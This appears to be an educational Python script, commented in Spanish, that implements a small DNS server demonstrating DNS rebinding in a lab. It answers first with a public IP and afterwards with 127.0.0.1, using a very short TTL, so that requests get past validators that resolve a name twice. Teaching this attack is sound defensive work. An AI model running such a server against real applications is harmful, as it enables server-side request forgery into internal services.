"""
dns_rebinding_server.py
-----------------------
Servidor DNS minimalista para DEMOSTRAR el concepto de DNS rebinding en un
entorno de laboratorio controlado.

Comportamiento: a la PRIMERA consulta A para el dominio configurado responde
con una IP publica (benigna), y a partir de la SEGUNDA consulta responde con
127.0.0.1. Esto simula un atacante que controla el DNS de su propio dominio
y cambia la respuesta justo despues de que el validador de una app hizo su
chequeo (resolucion #1) pero antes de que el cliente HTTP haga el fetch
real (resolucion #2), si la app resuelve el DNS dos veces por separado.

Escucha en un puerto NO privilegiado (5354 por defecto) para no necesitar
permisos de administrador ni tocar la configuracion de DNS del sistema.
El cliente de la demo (dns_rebinding_demo.py) le consulta directamente a
este puerto, simulando lo que haria el resolver de una app vulnerable.
Pensado para correr en tu propia maquina de laboratorio, nunca contra
infraestructura de terceros.

Uso:
    python dns_rebinding_server.py midominio.test
    python dns_rebinding_server.py midominio.test 5353   # puerto explicito
"""

import socket
import sys
import struct

# sys.argv es la lista de argumentos con los que se corrio el script desde
# la terminal: sys.argv[0] es el nombre del archivo, sys.argv[1] el primer
# argumento, etc. Si no se paso el argumento, usamos un valor por defecto.
DOMAIN = sys.argv[1] if len(sys.argv) > 1 else "midominio.test"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5354
PUBLIC_IP = "93.184.216.34"   # IP publica benigna de ejemplo (primer round)
REBIND_IP = "127.0.0.1"       # IP objetivo real (segundo round en adelante)

# Diccionario que lleva la cuenta de cuantas veces respondimos a cada
# cliente (clave = IP del que pregunta). Vive mientras el servidor esta
# corriendo; se resetea si lo reiniciamos.
query_count = {}

def build_response(query: bytes, ip: str) -> bytes:
    """
    Arma a mano, byte por byte, un paquete de respuesta DNS valido.
    DNS es un protocolo binario: cada mensaje (consulta o respuesta) tiene
    un formato fijo de header + preguntas + respuestas, definido en bytes
    crudos (no es texto). Por eso aca se trabaja todo con bytes y struct.
    """

    # --- Header del mensaje DNS (12 bytes fijos) ---
    # Un paquete DNS empieza siempre con un header de 12 bytes. Lo armamos
    # copiando algunas partes de la consulta original (para que la respuesta
    # "matchee" con la pregunta) y fijando otras a mano.

    transaction_id = query[:2]
    # Los primeros 2 bytes de CUALQUIER mensaje DNS son el "Transaction ID":
    # un numero que el cliente elige al azar para cada consulta, y que el
    # servidor debe devolver IGUAL en la respuesta. Asi el cliente sabe que
    # respuesta corresponde a que pregunta (importante si hay varias
    # consultas en simultaneo). Por eso lo copiamos tal cual de la consulta.

    flags = b"\x81\x80"
    # Estos 2 bytes son un campo de flags (bits de control) del protocolo
    # DNS. b"\x81\x80" en binario es 1000 0001 1000 0000, que codifica:
    # "esto es una respuesta" (no una pregunta), "respuesta estandar",
    # "recursion deseada" y "recursion disponible", "sin errores".
    # Es un valor fijo tipico de "respuesta DNS exitosa".

    qdcount = query[4:6]
    # Bytes 4-5 del header: "Question Count", cuantas preguntas trae el
    # mensaje. Lo copiamos de la consulta original (siempre va a ser 1,
    # porque mandamos una sola pregunta por consulta).

    ancount = b"\x00\x01"
    # "Answer Count": cuantas respuestas (registros) trae este mensaje.
    # Fijamos 1 porque siempre devolvemos exactamente una direccion IP.

    nscount = b"\x00\x00"
    # "Authority Count": registros de autoridad (servidores NS). No usamos
    # ninguno, asi que va en 0.

    arcount = b"\x00\x00"
    # "Additional Count": registros adicionales (ej. glue records). Tampoco
    # usamos, va en 0.

    # Concatenamos todos los bytes del header en el orden que exige el
    # protocolo: ID + flags + qdcount + ancount + nscount + arcount = 12 bytes.
    header = transaction_id + flags + qdcount + ancount + nscount + arcount

    # --- Seccion de pregunta ---
    question = query[12:]
    # Despues de los primeros 12 bytes (el header), el resto del mensaje de
    # consulta ES la pregunta (el nombre de dominio codificado + tipo +
    # clase). La copiamos tal cual: la respuesta DNS debe repetir la
    # pregunta que se le hizo.

    # --- Seccion de respuesta (un solo registro tipo A) ---
    answer = (
        b"\xc0\x0c"
        # Puntero de compresion DNS: en vez de repetir el nombre de dominio
        # completo otra vez, este valor especial (0xC0 0x0C) le dice al
        # que lee el paquete "el nombre de este registro es el mismo que
        # esta en el byte 12 del mensaje" (que es donde empieza la pregunta
        # que armamos arriba). Es una optimizacion estandar del protocolo.

        + b"\x00\x01"
        # Type = 1 = registro "A" (IPv4 address). Le dice al cliente que
        # lo que sigue es una direccion IPv4.

        + b"\x00\x01"
        # Class = 1 = "IN" (Internet). Practicamente siempre es este valor.

        + struct.pack(">I", 5)
        # TTL (Time To Live) en segundos: cuanto tiempo puede el cliente
        # guardar esta respuesta en cache antes de volver a preguntar.
        # struct.pack(">I", 5) convierte el numero entero 5 a 4 bytes en
        # formato "big-endian" (">") sin signo ("I" = unsigned int de 32
        # bits), que es como exige el protocolo. Usamos un TTL MUY BAJO
        # (5 segundos) a proposito: asi forzamos a que cualquier cliente
        # vuelva a preguntar pronto, y ahi es cuando le podemos devolver
        # una IP distinta (el "rebind").

        + b"\x00\x04"
        # Longitud de los datos que siguen, en bytes: una IPv4 ocupa
        # siempre 4 bytes, por eso este valor es fijo.

        + socket.inet_aton(ip)
        # inet_aton convierte una IP en formato texto ("127.0.0.1") a sus
        # 4 bytes crudos (uno por octeto). Eso es lo que va en el paquete
        # DNS real, no el string.
    )
    return header + question + answer


def main():
    # Creamos un socket UDP (SOCK_DGRAM) de tipo IPv4 (AF_INET). DNS usa UDP
    # normalmente (TCP solo en casos especiales), por eso elegimos UDP aca.
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # bind() hace que el socket "escuche" en esa direccion/puerto. "0.0.0.0"
    # significa "todas las interfaces de red de esta maquina" (no solo
    # localhost), aunque en esta demo solo nos interesa que conteste a
    # localhost.
    sock.bind(("0.0.0.0", PORT))
    print(f"Escuchando consultas DNS para '{DOMAIN}' en 127.0.0.1:{PORT}...")
    print(f"1ra consulta -> {PUBLIC_IP} | 2da en adelante -> {REBIND_IP}")

    while True:
        # recvfrom bloquea el programa (lo pausa) hasta que llega un paquete
        # UDP. Devuelve los datos recibidos (data) y de donde vinieron (addr,
        # una tupla (ip, puerto) del que mando la consulta).
        data, addr = sock.recvfrom(512)

        # Contamos por IP del cliente, NO por (ip, puerto): cada consulta UDP
        # nueva suele salir desde un puerto de origen distinto (el cliente
        # abre un socket nuevo por request), asi que si contaramos por addr
        # completo, CADA consulta parece "la primera" y nunca llegariamos a
        # la 2da respuesta (el rebind). Para esta demo asumimos un solo
        # cliente de laboratorio conectandose desde localhost.
        client_ip = addr[0]
        query_count[client_ip] = query_count.get(client_ip, 0) + 1

        # La logica del "rebinding": la primera vez que ESTE cliente
        # pregunta, le decimos la IP publica (para que pase cualquier
        # validacion de "no es una IP privada"). De la segunda consulta en
        # adelante, le mentimos y le damos la IP interna real.
        ip = PUBLIC_IP if query_count[client_ip] == 1 else REBIND_IP
        print(f"Consulta #{query_count[client_ip]} de {addr} -> respondiendo {ip}")

        # sendto manda la respuesta de vuelta exactamente a quien nos
        # pregunto (misma IP y mismo puerto de origen que vimos en recvfrom).
        sock.sendto(build_response(data, ip), addr)


if __name__ == "__main__":
    main()
